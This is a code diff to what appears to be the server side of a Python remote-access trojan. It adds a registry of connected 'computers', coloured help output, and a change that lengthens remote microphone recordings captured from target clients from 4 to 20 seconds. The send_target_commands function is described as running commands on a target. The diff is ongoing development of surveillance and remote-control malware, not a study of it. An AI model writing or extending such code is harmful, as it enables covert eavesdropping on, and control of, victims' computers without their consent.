@@ -35,6 +35,33 @@ COMMANDS = {'help': ['Shows this help'],
             }
 
 
+class clients:
+    number_of_computers = 0
+
+    def __init__(self, client_ip, client_port, client_name):
+        self.computer_id = clients.number_of_computers
+        clients.number_of_computers += 1
+        self.client_ip = client_ip
+        self.client_port = client_port
+        self.client_name = client_name
+
+    def get_client_name(self):
+        return socket.getfqdn(self.client_ip)
+
+
+class color:
+    PURPLE = '\033[95m'
+    CYAN = '\033[96m'
+    DARKCYAN = '\033[36m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
+
+
 def print_help():
     """
     The function prints all the commands we can use and what they do
@@ -42,7 +69,9 @@ def print_help():
     :return: None
     """
     for cmd, explanation in sorted(COMMANDS.iteritems()):
-        print("{0}:\t{1}".format(cmd, explanation[0]))
+        print(
+            "{0}:\t{1}".format((color.BOLD + color.UNDERLINE + cmd + color.END),
+                               (color.RED + explanation[0] + color.END)))
 
 
 def socket_create():
@@ -230,7 +259,7 @@ def get_audio(conn):
     audio_format = pyaudio.paInt16
     c_channels = 1
     c_rate = 44100
-    record_seconds = 4
+    record_seconds = 20
     wave_output_filename = "server_output.wav"
     width = 2
     frames = []
@@ -242,14 +271,15 @@ def get_audio(conn):
                     output=True,
                     frames_per_buffer=c_chunk)
 
-    i = 1
     data = conn.recv(1024)
+    i = 1
     while data:
         if str(data).__contains__('The file was sent'):
             stream.write(data[:str(data).find('The file was sent')])
             frames.append(data[:str(data).find('The file was sent')])
             break
         stream.write(data)
+        # print(str(data))
         data = conn.recv(1024)
         i = i + 1
         print(i)
@@ -273,6 +303,7 @@ def get_audio(conn):
 def send_target_commands(conn):
     """
     The function connects to a target client and executes commands
+
     :param conn: a connection
 
     :return: None
